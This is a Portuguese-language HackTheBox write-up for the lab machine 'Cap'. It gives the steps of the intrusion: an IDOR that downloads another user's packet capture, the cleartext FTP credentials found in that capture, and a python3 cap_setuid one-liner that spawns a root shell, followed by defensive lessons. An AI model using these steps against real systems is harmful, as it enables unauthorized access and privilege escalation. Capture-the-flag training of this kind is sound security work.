# Cap — HackTheBox

**Dificuldade:** Easy
**OS:** Linux
**Data:** 2026-10-09
**Status:** Pwned

---

## Sumário

Cap é uma máquina Linux de dificuldade fácil que explora uma vulnerabilidade de IDOR (Insecure Direct Object Reference) em uma aplicação web de monitoramento de rede. A exploração permite baixar uma captura de pacotes (PCAP) de outro usuário contendo credenciais FTP em texto claro. Com acesso SSH, a escalada de privilégios é feita via Linux Capabilities — o binário do Python3 possui `cap_setuid`, permitindo elevar para root.

---

## Reconhecimento

### Nmap

```bash
nmap -sC -sV -oN nmap.txt <IP>
```


Portas abertas encontradas:

| Porta | Serviço | Versão |
|-------|---------|--------|
| 21    | FTP     | vsftpd |
| 22    | SSH     | OpenSSH |
| 80    | HTTP    | Gunicorn |

---

## Enumeração Web

Ao acessar `http://<IP>`, encontramos uma dashboard de segurança de rede com funcionalidades de monitoramento de interfaces e captura de tráfego.

<!-- [PRINT: dashboard web] -->

A funcionalidade **Security Snapshot** gera uma captura de pacotes e redireciona para `/data/<id>`, onde `<id>` é um número inteiro sequencial.


---

## Exploração — IDOR

A aplicação não valida se o PCAP solicitado pertence ao usuário autenticado. Ao alterar o ID na URL para `0`, obtemos acesso a uma captura de outro usuário:

```
http://<IP>/data/0
```


Download do arquivo `0.pcap`.

---

## Análise do PCAP

Abrindo o arquivo no Wireshark e filtrando por protocolo FTP:

```
ftp
```


Encontramos uma sessão FTP com credenciais em texto claro:

- **Usuário:** `nathan`
- **Senha:** `Buck3tH4TF0RM3!`

---

## Acesso Inicial — User Flag

Com as credenciais encontradas, acessamos via SSH:

```bash
ssh nathan@<IP>
```


```bash
cat user.txt
```


---

## Escalada de Privilégios — Root Flag

### Enumeração de Capabilities

```bash
getcap -r / 2>/dev/null
```


Resultado relevante:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

O binário do Python3 possui `cap_setuid`, que permite ao processo alterar seu UID sem ser root. Isso é suficiente para escalar privilégios.

### Exploração

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```


```bash
whoami
cat /root/root.txt
```


---

## Conclusão

### Vulnerabilidades Exploradas

| Vulnerabilidade | Descrição |
|----------------|-----------|
| IDOR | Acesso a recursos de outros usuários por manipulação de ID na URL |
| Credenciais em texto claro | Tráfego FTP não cifrado capturado em PCAP |
| Linux Capabilities | `cap_setuid` no Python3 permite escalar para UID 0 |

### Lições Aprendidas

- Sempre validar autorização no lado do servidor ao servir recursos por ID
- Usar FTPS ou SFTP em vez de FTP puro
- Auditar Linux Capabilities com `getcap -r /` durante enumeração de priv esc
